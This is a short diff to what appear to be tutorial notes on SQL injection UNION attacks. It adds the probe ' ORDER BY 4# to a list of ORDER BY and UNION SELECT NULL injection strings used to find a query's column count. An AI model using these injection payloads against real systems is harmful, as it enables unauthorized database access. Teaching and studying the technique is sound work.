@@ -71,6 +71,7 @@ When performing an SQL injection UNION attack, there are two effective methods t
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
+' ORDER BY 4#
 etc.
 -----------------------------------
 ' UNION SELECT NULL--
